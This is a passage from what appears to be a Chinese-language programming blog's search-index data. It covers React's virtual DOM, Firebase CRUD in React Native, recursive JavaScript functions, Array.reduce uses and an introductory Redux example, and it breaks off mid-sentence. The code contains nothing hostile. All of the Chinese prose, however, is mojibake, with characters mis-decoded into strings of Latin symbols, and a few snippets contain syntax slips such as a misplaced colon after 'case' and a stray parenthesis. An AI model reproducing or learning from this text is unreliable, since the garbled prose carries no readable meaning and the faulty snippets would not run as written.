çš„å…§å®¹å¤§æ¦‚å°±é€™æ¨£ï¼ˆåªæœƒå­˜è·Ÿç•«é¢æ¯”è¼ƒæœ‰é—œçš„æ±è¥¿ï¼‰ï¼š 12345678{ tagName: \"div\", attrs: { id: \"app\", class: \"container\" }, childrens: [&lt;vNode&gt;]} è€Œç•¶ç•«é¢æˆ–è³‡æ–™æ”¹è®Šæ™‚ï¼Œå°±å†ç”¢ç”Ÿä¸€å€‹æ–°çš„ Virtual DOMï¼Œå»è·ŸèˆŠçš„åšæ¯”å°ï¼ˆdiff / Reconciliationï¼‰ï¼Œæœ€å¾Œæ‰å»æ“ä½œ DOM æŠŠçœŸçš„è¦æ”¹çš„åœ°æ–¹æ”¹æ‰ã€‚ æµç¨‹å¤§æ¦‚æ˜¯é€™æ¨£ï¼š æ ¹æ“šæœ€é–‹å§‹çš„ DOM ä¾†å»ºç«‹åˆå§‹çš„ Virtual DOM ç•¶ state ç™¼ç”Ÿæ”¹è®Šæ™‚ï¼Œåœ¨ç”¢ç”Ÿä¸€å€‹æ–°çš„ Virtual DOM åŸ·è¡Œ diff æ¼”ç®—æ³•ï¼ŒæŠŠæ–°èˆŠçš„ Virtual DOM åšæ¯”å° æ‰¾å‡ºçœŸæ­£è¦æ”¹è®Šçš„åœ°æ–¹ä»¥å¾Œï¼Œæ‰å»æ“ä½œ DOM ç¸½ä¹‹é€é Virtual DOM çš„æ–¹å¼å°±å¯ä»¥çœä¸‹æ“ä½œ DOM çš„æˆæœ¬ã€‚ é—œæ–¼ Diff æ¼”ç®—æ³•Diff æ¼”ç®—æ³•æ˜¯ç”¨å…©é¡†æ¨¹ï¼ˆä¸€ç¨®è³‡æ–™çµæ§‹ï¼‰ä¾†åšæ¯”å°ï¼Œä½†é€šå¸¸é€™å€‹æ­¥é©Ÿéå¸¸ç¹ç‘£ï¼Œå°±ç®—æ˜¯ç”¨æœ€å°‘æ­¥é©Ÿä¹Ÿå¾—è¦ O(nÂ³) çš„æ™‚é–“è¤‡é›œåº¦æ‰è¡Œï¼Œæ‰€ä»¥ React ä¸å¯èƒ½é€™æ¨£åšã€‚ React çš„åšæ³•æ˜¯åšäº†ä¸€äº›å„ªåŒ–ï¼Œç¬¬ä¸€ç¨®æ˜¯åƒä¸‹åœ–é€™æ¨£ï¼š ç•¶å®ƒç™¼ç¾ A ä¸‹é¢çš„ B æ¶ˆå¤±æ™‚ï¼Œæœƒç›´æ¥æŠŠ B ç¯€é»ç æ‰é‡ç·´ï¼Œç›´æ¥ç”Ÿä¸€å€‹æ–°çš„ï¼Œä¸æœƒå†å»æ¯”å° B çš„å­ç¯€é»ã€‚ ç¬¬äºŒç¨®æ˜¯ keyï¼Œå°±æ˜¯åœ¨æ¸²æŸ“ä¸€ç³»åˆ— component çš„æ™‚å€™æœƒåŠ ä¸Šçš„é‚£å€‹ keyã€‚å®ƒçš„ç”¨æ„å°±æ˜¯è¦è®“ diff æ™‚å¯ä»¥æœ‰ä¸€å€‹æ ¹æ“šï¼Œæ›´å¿«çš„æ‰¾å‡ºå“ªè£¡ç™¼ç”Ÿäº†æ”¹è®Šã€‚","link":"/2022/04/07/react-virtual-dom/"},{"title":"React Nativeï¼ä¸²æ¥ Firebase","text":"çµ‚æ–¼ä¾†å¡«é€™å€‹å‘ã€‚ è§£åˆ°æ­»çš„ bugï¼ˆReact Nativeï¼‰æ”¾ç½®é ‚æ˜¯å› ç‚ºç•¶åˆä¸€ç›´æ‰¾ä¸åˆ°é—œéµå­—ä¾†è§£é€™å€‹ bugï¼Œæ‰€ä»¥èŠ±äº†ä¸€æ®µæ™‚é–“æ‰è§£å‡ºä¾†ã€‚ ç¸½ä¹‹å‘¢ï¼Œé€™å€‹ bug æ˜¯åªè¦æŠŠ firebase å¼•å…¥ä¾†ç”¨æ™‚ï¼Œå°±æœƒå‡ºç¾ç·¨è­¯å¤±æ•—ç„¶å¾Œé¡¯ç¤ºä¸‹é¢çš„éŒ¯èª¤è¨Šæ¯ï¼š While trying to resolve module â€˜idbâ€™ from file â€¦ the package was successfully found. However, this package itself specifies a main module field that could not be resolved.Indeed, none of these files exist: ç°¡å–®ä¾†èªªé€™æ˜¯å› ç‚º firebase ä½¿ç”¨ .cjs çš„å‰¯æª”åï¼Œè€Œ Expo è·Ÿ React Native ä¸æ”¯æ´ï¼Œæ‰€ä»¥ä½ è¦æ‰‹å‹•èª¿æ•´ä¸€äº›è¨­å®šä¾†è®“ä»–å€‘æ”¯æ´ã€‚ åœ¨æ ¹ç›®éŒ„å»ºç«‹ metro.config.jsï¼Œå¡«å…¥åº•ä¸‹å…§å®¹ï¼š 12345678const { getDefaultConfig } = require(\"@expo/metro-config\");const defaultConfig = getDefaultConfig(__dirname);// push .cjs é€™å€‹å‰¯æª”ådefaultConfig.resolver.assetExts.push(\"cjs\");module.exports = defaultConfig; å¦‚æœæ˜¯ React Native cli çš„è©±ï¼š 123456789const { getDefaultConfig } = require(\"metro-config\");const { resolver: defaultResolver } = getDefaultConfig.getDefaultValues();exports.resolver = { ...defaultResolver, sourceExts: [ ...defaultResolver.sourceExts, \"cjs\", ],}; é€™æ¨£å°±è§£æ±ºäº†ï¼Œè©³ç´°å¯ä»¥åƒè€ƒ å®˜æ–¹æ–‡ä»¶ æˆ–é€™ç¯‡ è¨è«–ã€‚ åŸºç¤æ¦‚å¿µFirebase ä¸­æœ‰å…©å€‹ä¸»è¦çš„æ±è¥¿ï¼š collection å¯ä»¥æƒ³æˆæ˜¯ table çš„æ„Ÿè¦º document å¯ä»¥æƒ³æˆæ˜¯æ¬„ä½çš„æ„æ€ Firebase æ˜¯é€éã€Œè·¯å¾‘ã€ä¾†è¡¨ç¤ºè³‡æ–™åº«ï¼Œæ¯”å¦‚èªªæˆ‘æœ‰é€™æ¨£çš„æ±è¥¿ï¼š æŠŠè³‡æ–™è½‰æ›æˆç¶²å€çš„è©±å°±æœƒåƒä¸Šé¢é€™å¼µåœ–ä¸€æ¨£ã€‚ æ‡¶äººåŒ… APIgeneral initializeApp åˆå§‹åŒ–ï¼ŒinitializeApp(firebaseConfig) getFirestore å»ºç«‹ DB çš„ referenceï¼ŒgetFirestore(app) doc å»ºç«‹ document çš„ reference getDoc å–å¾—å–®ä¸€å€‹ documentï¼ˆæ³¨æ„æ²’æœ‰ sï¼‰ getDocs ä¸€æ¬¡å–å¾— collection ä¸­çš„æ‰€æœ‰ document setDoc å»ºç«‹æˆ–æ›´æ–° document deleteDoc åˆªé™¤ document collection ç”¨ä¾†è¨­å®š reference çš„æ–¹æ³•ï¼Œä¾‹å¦‚ï¼šcollection(db, 'orders') serverTimestamp å–å¾—æ™‚é–“æˆ³ï¼ˆå¯ç”¨ä¾†è¨­å®š createdAtï¼‰ query ç›¸é—œ query æ‹¿ä¾†ä¸‹æŒ‡ä»¤ orderBy æ’åº limit é™åˆ¶æ•¸é‡ å‰ç½®ä½œæ¥­é¦–å…ˆï¼šexpo install firebase é™„è¨»ï¼šå»ºè­°è£çš„å¥—ä»¶ npm install tslibï¼ˆèƒ½é¿å…å™´ Errorï¼‰ å…ˆå»ºç«‹å°ˆæ¡ˆ è·³è½‰å¾Œé¸æ“‡ã€Œwebã€ä¾†å»ºç«‹ App æŠŠ config çš„å…§å®¹è¨˜ä¸‹ä¾†ï¼Œç­‰ä¸€ä¸‹æœƒç”¨åˆ° å»ºç«‹ database å¾å´é‚Šæ¬„é»é¸ã€Œfirestore databaseã€ é»é¸ã€Œå»ºç«‹è³‡æ–™åº«ã€ é»é¸ã€Œå·²æ¸¬è©¦æ¨¡å¼å•Ÿå‹•ã€ é»é¸ã€Œå•Ÿç”¨ã€ å®Œæˆå¾Œå°±å¯ä»¥å»ºç«‹ collectionï¼ˆtableï¼‰ äº†ã€‚ å¦‚æœæƒ³è¦è¨­å®šä¸€äº›é™åˆ¶ï¼Œå¯ä»¥åˆ°ã€Œè¦å‰‡ã€é€™å€‹ tab ä¾†è¨­å®šã€‚ è·Ÿè³‡æ–™åº«é€£ç·šï¼ˆåˆå§‹åŒ–ï¼‰è©³ç´°å¯ä»¥åƒè€ƒé€™å€‹å®˜æ–¹æ–‡ä»¶ 12345678910111213141516import { initializeApp } from \"firebase/app\";import { getFirestore } from \"firebase/firestore\";const firebaseConfig = { apiKey: \"...\", authDomain: \"...\", projectId: \"...\", storageBucket: \"...\", messagingSenderId: \"...\", appId: \"...\"};// Initialize Firebaseconst app = initializeApp(firebaseConfig);// Db referenceï¼ˆå¾ŒçºŒçš„æ“ä½œéƒ½æœƒé€éä»–ä¾†åšï¼‰export const db = getFirestore(app); åŸºæœ¬çš„ CRUDCreateï¼ˆsetDocï¼‰1234567891011121314151617181920212223import { db } from \"../firebase\";import { doc, setDoc } from \"firebase/firestore\";export default function Com1 () { const create = () =&gt; { // document Reference const docRef = doc(db, 'MyCollection', 'MyDocument'); // è¦è¼¸å…¥çš„è³‡æ–™ const docData = { name: 'PeaNu', age: 30, job: 'Front-End' } // Send request to firebase setDoc(docRef, docData) .then(() =&gt; alert('Create Succuess!')) .catch(err =&gt; alert(err.message)) } return &lt;button onClick={create}&gt;Create Document&lt;/button&gt;} Readï¼ˆgetDocï¼‰123456789101112131415161718192021222324252627282930313233343536373839import { db } from \"../firebase\";import { doc, setDoc, getDoc } from \"firebase/firestore\";import { useEffect, useState } from \"react\";export default function Com1 () { // Store user data const [user, setUser] = useState(null); const read = () =&gt; { // document Reference const docRef = doc(db, 'MyCollection', 'MyDocument'); getDoc(docRef) .then(snapshot =&gt; { // Check if data exists or not if (snapshot.exists()) { setUser(snapshot.data()); } else { alert('No doc found'); } }) .catch(err =&gt; alert(err.message)) } return ( &lt;&gt; {user &amp;&amp; ( &lt;div&gt; &lt;h2&gt;Name: {user.name}&lt;/h2&gt; &lt;p&gt;Age: {user.age}&lt;/p&gt; &lt;p&gt;Job: {user.job}&lt;/p&gt; &lt;/div&gt; )} &lt;button onClick={read}&gt;Read Document&lt;/button&gt; &lt;/&gt; )} å¦‚æœ collection æˆ– document ä¸å­˜åœ¨çš„è©±å°±æœƒå¹«ä½ å»ºç«‹ä¸€å€‹æ–°çš„ã€‚åä¹‹ï¼Œå¦‚æœå­˜åœ¨çš„è©±å°±æœƒå¹«ä½ æŠŠå…§å®¹æ›´æ–°ã€‚ Updateï¼ˆsetDocï¼‰ä¸€æ¨£æ˜¯ç”¨ setDoc é€™å€‹æ–¹æ³•ï¼Œä¸éæœƒç¨å¾®åšé»è®ŠåŒ–ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import { db } from \"../firebase\";import { doc, setDoc, getDoc } from \"firebase/firestore\";import { useState } from \"react\";export default function Com1 () { // Store user data const [user, setUser] = useState(null); // Store input value const [value, setValue] = useState(\"\"); const read = () =&gt; { const docRef = doc(db, 'MyCollection', 'MyDocument'); getDoc(docRef) .then(snapshot =&gt; { if (snapshot.exists()) { setUser(snapshot.data()); } else { alert('No doc found'); } }) .catch(err =&gt; alert(err.message)) } const update = (data, merge) =&gt; { const docRef = doc(db, 'MyCollection', 'MyDocument'); // merge: true = åªæ›´æ–°éƒ¨åˆ†è³‡æ–™ // merge: false = æ•´ç­†è¦†å¯« setDoc(docRef, data, { merge: merge }) .then(() =&gt; { alert('Update Success') // reload screen when finish update read() }) .catch(err =&gt; alert(err.message)) } return ( &lt;&gt; {user &amp;&amp; ( &lt;div&gt; &lt;h2&gt;Name: {user.name}&lt;/h2&gt; &lt;p&gt;Age: {user.age}&lt;/p&gt; &lt;p&gt;Job: {user.job}&lt;/p&gt; &lt;/div&gt; )} &lt;button onClick={() =&gt; update({name: value}, true)}&gt;Update Document&lt;/button&gt; &lt;input style={{ display: 'block', margin: '20px 0'}} type=\"text\" placeholder=\"Update name\" onChange={e =&gt; setValue(e.target.value)} value={value} /&gt; &lt;/&gt; )} Deleteï¼ˆdeleteDocï¼‰åˆªé™¤ç¸½æ˜¯æœ€å–®ç´”ï¼š 123456789101112131415161718import { db } from \"../firebase\";import { doc, deleteDoc } from \"firebase/firestore\";export default function Com1 () { const Delete = () =&gt; { const docRef = doc(db, 'MyCollection', 'MyDocument'); deleteDoc(docRef) .then(() =&gt; { alert('Delete Success'); }) .catch(err =&gt; alert(err.message)) } return &lt;button onClick={Delete}&gt;Delete Document&lt;/button&gt; )} è¤‡é›œä¸€é»çš„æ“ä½œï¼ˆä¸‹ Queryï¼‰å‡è¨­æˆ‘çš„éœ€æ±‚æ˜¯é€™æ¨£ï¼š æŠ“å‡º collection ä¸­çš„æ‰€æœ‰ document æ ¹æ“š document è³‡æ–™è£¡çš„æ™‚é–“æˆ³æ’åºï¼Œå–å‡ºæœ€æ–°çš„ä¸€ç­†è³‡æ–™ é€™å°±æœƒç”¨åˆ° queryï¼Œä¸€å€‹å¯ä»¥è®“æˆ‘å€‘ä¸‹æŒ‡ä»¤çš„æ–¹æ³•ï¼š 123456789101112131415161718import { db } from \"../firebase\";import { getDocs, collection, query, orderBy, limit } from \"firebase/firestore\";import { useEffect } from \"react\";export default function Com1 () { useEffect(() =&gt; { const q = query(collection(db, 'orders'), orderBy('createdAt', 'desc'), limit(1)); getDocs(q).then(querySnapshot =&gt; { querySnapshot.forEach(document =&gt; { console.log('Document', document.data()); }) }) }, []) return (...)} é€™é‚Šè¦ç‰¹åˆ¥æ³¨æ„ï¼Œå¦‚æœä½ è©¦è‘—ç”¨ console.log(querySnapshot) æ˜¯æ‹¿ä¸åˆ°çœŸæ­£çš„è³‡æ–™çš„ï¼Œå› ç‚ºåœ¨ firebase ä¸­ã€Œå–å€¼ã€é€™ä»¶äº‹éƒ½å¾—é€é getterï¼Œæ‰€ä»¥æ‰æœƒç”¨ forEach æ­é… .data() ä¾†å–å‡º document çš„å€¼ã€‚ åƒè€ƒè³‡æ–™ å®˜æ–¹æ–‡ä»¶ å¹«åŠ©å¾ˆå¤§çš„ CRUD å½±ç‰‡ Debug çš„è¨è«–","link":"/2022/06/04/react-with-firebase/"},{"title":"å¯¦ä½œéè¿´å‡½å¼","text":"ä¸€äº›ç°¡å–®çš„éè¿´ç¯„ä¾‹ã€‚ ç°¡è¿°é—œæ–¼éè¿´çš„å¥—è·¯ï¼š å¹¾ä¹éƒ½æ˜¯åœ¨å‘¼å« function çš„æ™‚å€™ã€ŒæŠŠåƒæ•¸å€¼æ›´æ–°ã€ä¾†åšå‡ºåƒè¿´åœˆä¸€æ¨£çš„æ•ˆæœã€‚ è¦æ±‚å‡º A çš„å€¼ï¼Œå°±å…ˆæ‰¾å‡º A-1 çš„å€¼ ä¸€ç›´ã€Œå¾€å‰ã€æ‰¾ï¼Œæ‰¾åˆ°æœ€å¾Œçš„çµ‚æ­¢æ¢ä»¶ç‚ºæ­¢ã€‚ æ±‚å‡ºæŸæ•¸çš„ N æ¬¡æ–¹123456789function power(base, exponent) { if (exponent &gt; 0) { return base * power(base, exponent-1) } else { return 1 }}var result = power(2, 31)console.log(result) // 2147483648 ä¸æ‡‚å¾—è©±åƒè€ƒä¸€ä¸‹ä½ è‡ªå·±äº‚ç•«çš„åœ–ï¼š æ±‚å‡ºéšå±¤12345678910function factorial (n) { if (n &gt; 1) { return n * factorial(n-1) } else { return 1 }}var result = factorial(5)console.log(result) è²»å¼æ•¸åˆ—12345678function fab(n) { if(n &lt; 2) { return n } else { return fab(n-1) + fab(n-2) }}console.log(fab(10)) æ¸…é™¤ DOM çš„æ–‡å­—ç¯€é»123456789101112131415161718192021222324252627282930/* cleanJunkNodes æœƒæ¥æ”¶ä¸€å€‹ç¯€é»ï¼š 1. å–å¾—è©²ç¯€é»ä¸‹çš„æ‰€æœ‰å­ç¯€é» 2. åˆ¤æ–·å­ç¯€é»çš„å€¼ 3. å¦‚æœæ˜¯æ²’ç”¨çš„ç¯€é»å°±åˆªæ‰*/function cleanJunkNodes (node) { // éæ­·æ‰€æœ‰å­ç¯€é» for (let i=0; i&lt;node.childNodes.length; i++) { // å­˜å–ç¬¬ i å€‹å­ç¯€é» let child = node.childNodes[i] // å¦‚æœæ˜¯è¨»è§£ or æ–‡å­—ç¯€é»ï¼ˆåªæœ‰ç©ºç™½å­—å…ƒï¼‰ if ( child.nodeType === 8 || child.nodeType === 3 &amp;&amp; !/\\S/.test(child.nodeValue) ) { // åˆªé™¤å­ç¯€é» node.removeChild(child) // å¾€å‰é€€ä¸€æ ¼ï¼ˆå› ç‚ºé•·åº¦è®ŠçŸ­äº†ï¼‰ i-- } else if (child.nodeType === 1) { // å¦‚æœå­ç¯€é»ä¹Ÿæ˜¯å…ƒç´ ï¼Œä¸Ÿåˆ°éè¿´ cleanJunkNodes æ¸…é™¤åƒåœ¾ç¯€é» cleanJunkNodes(child) } }} äºŒåˆ†æœå°‹æ³•1234567891011121314151617181920212223242526272829303132333435363738// è¦éè¿´çš„ function function binarySearchRecursively(array, targetElement, start, end) { // å·¦é‚Šç•Œ &gt; å³é‚Šç•Œ if (start &gt; end) { return -1 } // ä¸­é–“ä½ç½®ï¼ˆç„¡æ¢ä»¶æ¨å»ï¼Œå–åå·¦é‚Šé‚£é»ï¼‰ const middle = (start + end) &gt;&gt; 1 /* ç›®æ¨™ = ä¸­é–“é‚£å€‹æ•¸å­—ï¼š æ‰¾åˆ°æ•¸å­—äº†ï¼Œç›´æ¥å›å‚³ä½ç½® ç›®æ¨™ &gt; ä¸­é–“çš„æ•¸å­—ï¼š ä»£è¡¨å‰é¢çš„æ•¸å­—ä¸ç”¨çœ‹äº†ï¼ŒæŠŠ start è¨­ç‚ºä¸­é–“ä½ç½®å¾€å³ç§»ä¸€ä½ï¼ˆ+1ï¼‰ ç›®æ¨™ &lt; ä¸­é–“çš„æ•¸å­—ï¼š ä»£è¡¨å¾Œé¢çš„æ•¸å­—ä¸ç”¨çœ‹äº†ï¼ŒæŠŠ end è¨­ç‚ºä¸­é–“ä½ç½®å¾€å·¦ç§»ä¸€ä½ï¼ˆ-1ï¼‰ */ if (targetElement === array[middle]) { return middle } else if (targetElement &gt; array[middle]) { // æ›´æ–° start å¾Œï¼Œéè¿´ binarySearchRecursively return binarySearchRecursively(array, targetElement, middle + 1, end) } else { // æ›´æ–° end å¾Œï¼Œéè¿´ binarySearchRecursively return binarySearchRecursively(array, targetElement, start, middle - 1) }}// ç”¨ä¾†åŸ·è¡Œ binarySearchRecursivelyfunction binarySearch(array, targetElement) { return binarySearchRecursively(array, targetElement, 0, array.length-1)}const numbers = [1, 3, 24, 33, 57, 88, 99, 101]console.log(binarySearch(numbers, 25)) // -1console.log(binarySearch(numbers, 24)) // 2 å¿«é€Ÿæ’åºæ³•1234567891011121314151617181920212223242526272829function quickSort(arr) { // åœæ­¢é»ï¼Œç•¶ arr é•·åº¦ç‚º 1 æˆ–æ²’æœ‰å…ƒç´ äº† if (arr.length &lt;= 1) { return arr } // åŸºæº–é» index const pivotIndex = Math.floor(arr.length / 2) // åŸºæº–é» number const pivotNumber = arr.splice(pivotIndex, 1)[0] // æ¯”åŸºæº–é»å°çš„æ•¸åˆ— let samllerNumbers = [] // æ¯”åŸºæº–é»å¤§çš„æ•¸åˆ— let biggerNumbers = [] // æŠŠå°çš„æ”¾åˆ° samllï¼Œå¤§çš„æ”¾åˆ° bigger for (let i=0; i&lt;arr.length; i++) { if (arr[i] &lt; pivotNumber) { samllerNumbers.push(arr[i]) } else { biggerNumbers.push(arr[i]) } } // æŠŠå°çš„è·Ÿå¤§çš„éƒ½ä¸Ÿåˆ° quickSort éè¿´ï¼Œæœ€å¾Œè¦è·Ÿ pivot çµåˆèµ·ä¾† return quickSort(samllerNumbers).concat([pivotNumber], quickSort(biggerNumbers))}const numbers = [5, 44, 23, 3, 42, 4, 2]console.log(quickSort(numbers)) å£“å¹³é™£åˆ—1234567891011121314151617181920212223function flatten(arr) { // å„²å­˜å£“å¹³å¾Œçš„é™£åˆ— const result = [] // éæ­·é™£åˆ—å…ƒç´  arr.forEach(item =&gt; { // å¦‚æœå…ƒç´ æ˜¯é™£åˆ—ï¼Œéè¿´é€™å€‹ function if(Array.isArray(item)) { // å‘¼å«è‡ªå·± const flattenArray = flatten(item) // æŠŠå£“å¹³å¾Œçš„é™£åˆ— push å›çµæœ flattenArray.forEach(item =&gt; result.push(item)) } else { result.push(item) } }) // å›å‚³çµæœ return result}console.log(flatten([1, 2, 3])) // [1, 2, 3]console.log(flatten([1, 2, 3, [1, 2], [3, 4], 5])) // [1, 2, 3, 1, 2, 3, 4, 5]console.log(flatten([1, 2, 3, [1, [2]], [3, 4, [5]], 6])) // [1, 2, 3, 1, 2, 3, 4, 5, 6]console.log(flatten(['1,', 2, 3])) // ['1,', 2, 3] å¯¦ä½œ DOM çš„ closest æ–¹æ³•12345678910111213function closestRecursive(node, className) { // å¦‚æœç¯€é»ä¸å­˜åœ¨ or ä¸åŒ…å« class // å›å‚³ null ä»£è¡¨æ‰¾åˆ°åº•äº† if (!node || !node.classList) { return null } // å¦‚æœç¬¦åˆ classNameï¼Œä»£è¡¨æ‰¾åˆ°äº† if (node.classList.contains(className)) { return node } // é‚„æ²’æ‰¾å®Œï¼Œç¹¼çºŒå¾€ä¸Šä¸€å±¤æ‰¾ return closestRecursive(node.parentNode, className)} é¡ä¼¼ setInterval çš„ setTimeout1234567function log(i) { console.log(i) setTimeout(() =&gt; { log(++i) }, 1000)}log(1)","link":"/2021/12/19/recursive/"},{"title":"reduce çš„å…¶ä»–ç©æ³•","text":"ç´€éŒ„ä¸€ä¸‹ï¼ŒArray.reduce é€™å€‹æ–¹æ³•èƒ½åšçš„äº‹æƒ…é‚„è »å¤šçš„ã€‚ å»ºç«‹ç‰©ä»¶12345678const arr = [1, 2, 3, 4, 5]const result = arr.reduce((acc, elem) =&gt; { // å…ˆä¿®æ”¹ accumulator çš„å€¼ acc['A'+elem] = elem // ä¿®æ”¹å¾Œåœ¨ return å›å» return acc}, {})console.log(result) // {A1: 1, A2: 2, A3: 3, A4: 4, A5: 5} è¨ˆç®—å°æ–¼ n çš„ç¸½å’Œ1234567891011121314const arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]const result = arr.reduce((acc, elem) =&gt; { // æŠŠå°æ–¼ 5 çš„å…ƒç´ åŠ åˆ° accumulator if(elem &lt; 5) { // å…ˆæ›´æ–°å€¼ acc = acc + elem // å†å›å‚³ return acc } else { // ä¸æ›´æ–°ç›´æ¥å›å‚³ return acc }}, 0)console.log(result) // 10 å»ºç«‹å°æ–¼ n é™£åˆ—1234567891011121314const arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]const result = arr.reduce((acc, elem) =&gt; { // æŠŠå°æ–¼ 5 çš„å…ƒç´ åŠ åˆ° accumulator if(elem &lt; 5) { // å…ˆæ›´æ–°å€¼ acc.push(elem) // å†å›å‚³ return acc } else { // ä¸æ›´æ–°ç›´æ¥å›å‚³ return acc }}, [])console.log(result) // [1, 2, 3, 4]","link":"/2022/01/01/reduce-usage/"},{"title":"åˆæ¢ Redux","text":"åšäº†å¥½å¤šæ¬¡ç·´ç¿’ã€‚ ç°¡è¿°é€™é‚Šæœƒè·Ÿè‘— Redux å®˜æ–¹æ–‡ä»¶ ä¾†è·‘ä¸€æ¬¡æµç¨‹ã€‚ åœ¨ä»‹ç´¹ä¹‹å‰ï¼Œè®“æˆ‘åœ¨å¼·èª¿ä¸€æ¬¡ï¼š Redux ä¸¦æ²’æœ‰è·Ÿ React ç¶åœ¨ä¸€èµ· Redux ä¸¦æ²’æœ‰è·Ÿ React ç¶åœ¨ä¸€èµ· Redux ä¸¦æ²’æœ‰è·Ÿ React ç¶åœ¨ä¸€èµ· æˆ‘åœ¨å­¸ä¹‹å‰ä¹Ÿä»¥ç‚ºä»–æ˜¯å°ˆå±¬æ–¼ React çš„æ±è¥¿ï¼Œç•¢ç«Ÿæ˜¯ä»¥ã€ŒReã€é–‹é ­çš„å˜›ã€‚ ç¸½ä¹‹å‘¢ï¼Œå®ƒåªæ˜¯ä¸€å€‹åŸºæ–¼ flux æ‰“é€ çš„ libraryï¼Œç”¨ä¾†ã€Œç®¡ç†ç‹€æ…‹ã€ã€‚ä½ å¯ä»¥æ­é… Vanilla JS ä¾†ç”¨ï¼Œæˆ–ç”šè‡³æ˜¯åˆ¥çš„ç¨‹å¼èªè¨€ä¹Ÿå¯ä»¥ã€‚ å¾å››å¤§è¦ç´ é–‹å§‹é€™é‚Šå…ˆç°¡å–®ä»‹ç´¹ Redux è£¡é¢å¹¾å€‹ä¸»è¦çš„è§’è‰²ï¼š storeï¼ˆé€é reducer ä¾†å»ºç«‹ï¼‰ reducerï¼ˆè·Ÿ array çš„ reduce æ¦‚å¿µå¾ˆç›¸ä¼¼ï¼‰ actionï¼ˆä¸€å€‹ Objectï¼Œæœƒæœ‰ type è·Ÿ payloadï¼‰ dispatchï¼ˆé€éå®ƒä¾†ç™¼å‡º action çµ¦ reducerï¼‰ ç­‰ä¸€ä¸‹çš„ç¯„ä¾‹æœƒä¸€ä¸€ä»‹ç´¹å®ƒå€‘æ˜¯å¹¹å˜›ç”¨çš„ï¼Œå»¢è©±ä¸å¤šèªªï¼Œé–‹å§‹å§ï¼ é€™é‚Šçš„ç¯„ä¾‹å¾ˆç°¡å–®ï¼Œåªéœ€è¦å¯«ä¸€éš»æª”æ¡ˆå°±è¡Œäº†ï¼Œæ‰€ä»¥ç›´æ¥é™„ä¸Š codeï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import { createStore } from 'redux';// stateï¼ˆåˆå§‹å€¼ï¼‰const initState = { todos: []}let id = 0;// reducerfunction todosReducer (state = initState, action) { switch (action.type) { // action case \"addTodo\": return { ...state, todos: [ ...state.todos, { id: id++, name: action.payload.name, } ] } // action case \"deleteTodo\": return { ...state, todos: state.todos.filter(todo =&gt; todo.id !== action.payload.id) } default: return state }}// storeï¼ˆç”¨ reducer å»ºç«‹ï¼‰const store = createStore(todosReducer);// é€™å€‹å¾…æœƒå†è§£é‡‹store.subscribe(() =&gt; { console.log('Change!'); console.log(store.getState());})// ä¸‹é¢éƒ½æ˜¯ dispatchstore.dispatch({ type: 'addTodo', payload: { name: 'todo1' }})store.dispatch({ type: 'addTodo', payload: { name: 'todo2' }})store.dispatch({ type: 'addTodo', payload: { name: 'todo3' }})store.dispatch({ type: 'deleteTodo', payload: { id: 1 }}) è¦å»ºç«‹ä¸€å€‹ store çš„ç¬¬ä¸€æ­¥æ˜¯å…ˆå¯«å¥½ã€Œreducerã€ï¼Œé€™å€‹ç¯„ä¾‹çš„ reducer æ˜¯ todosReducer é€™å€‹ functionã€‚ ç°¡å–®ä¾†èªªï¼Œreducer å°±æ˜¯ä¸€å€‹ç”¨ä¾†ã€Œç”¢ç”Ÿ stateã€çš„æ±è¥¿ï¼Œåªè¦çµ¦ä»–å°æ‡‰çš„ ã€Œactionã€ï¼Œå®ƒå°±åçµ¦ä½ å°æ‡‰çš„ stateã€‚ è‡³æ–¼ reducer è£¡é¢è¦åšä»€éº¼è™•ç†æ˜¯æˆ‘å€‘è‡ªå·±æ±ºå®šçš„ï¼Œåƒæ˜¯æˆ‘å€‘å¸Œæœ›æ¥æ”¶åˆ° addTodo é€™å€‹ action æ™‚ï¼Œå°±æ–°å¢ä¸€ç­† todo åˆ° state è£¡é¢ï¼Œæ‰€ä»¥æ‰æœƒæœ‰é€™æ®µï¼š 1234567891011121314switch (action.type) { case: 'addTodo': return { ...state, todos: [ ...state.todos, { id: id++, name: action.payload, } ] } // ...} å¾Œé¢çš„ deleteTodo ä¹Ÿæ˜¯ä»¥æ­¤é¡æ¨ã€‚ å®šç¾©å¥½ reducer ä»¥å¾Œï¼Œåªè¦æŠŠå®ƒä¸Ÿåˆ° Redux æä¾›çš„ createStoreï¼Œstore å°±å»ºç«‹å¥½äº†ï¼Œå°±æ˜¯é€™éº¼ç°¡å–®ã€‚ 1const store = createStore(todosReducer); æ¥ä¸‹ä¾†ï¼Œæ¯ç•¶æˆ‘æƒ³è¦å° store è£¡é¢çš„æ±è¥¿åšäº‹æƒ…ï¼Œå°±å¾—é€éã€Œdispatchã€+ã€Œactionã€æ‰å¯ä»¥ï¼š 123456store.dispatch({ type: 'addTodo', payload: { name: 'todo1' }}) é€™ä¸€æ®µçš„æ„æ€å°±æ˜¯èªªã€Œæˆ‘æƒ³åŸ·è¡Œ addTodo é€™å€‹ actionã€ï¼Œéº»ç…©å¹«æˆ‘ dispatchï¼ˆæŒ‡æ´¾ï¼‰çµ¦ reducerã€‚ çœ¼å°–ä¸€é»å°±æœƒæ³¨æ„åˆ° action å…¶å¯¦åªæ˜¯ä¸€å€‹ Objectï¼Œè£¡é¢æœƒæ”¾ type è·Ÿ payload é€™å…©å€‹ keyï¼Œä»£è¡¨æˆ‘æƒ³åšçš„äº‹æƒ…è·Ÿé¡å¤–è³‡è¨Šã€‚ æ‰€ä»¥ç•¶æˆ‘ dispatch é€™å€‹ action ä»¥å¾Œï¼Œreducer å°±æœƒåçµ¦æˆ‘æ–°çš„ stateï¼Œå®ƒæ‡‰è©²è¦é•·çš„åƒé€™æ¨£ï¼š 12345{ todos: [ { id: 0, name: 'todo1' } ]} ä»¥ä¸Šå°±æ˜¯æœ€åŸºæœ¬çš„æµç¨‹ï¼Œæ²’æœ‰å¾ˆè¤‡é›œï¼Œæœ¬è³ªå°±æ˜¯é€™æ¨£è€Œå·²ã€‚ è‡³æ–¼é€™ä¸€æ®µï¼š 1234store.subscribe(() =&gt; { console.log('Change!'); console.log(store.getState());}) å…¶å¯¦å°±è·Ÿ addEventLisener() 87 åˆ†åƒï¼Œå®ƒçš„æ„æ€æ˜¯ã€Œç•¶ state æ”¹è®Šçš„æ™‚å€™å¹«æˆ‘ call é€™å€‹ functionã€ï¼š 12button.addEventListender(() 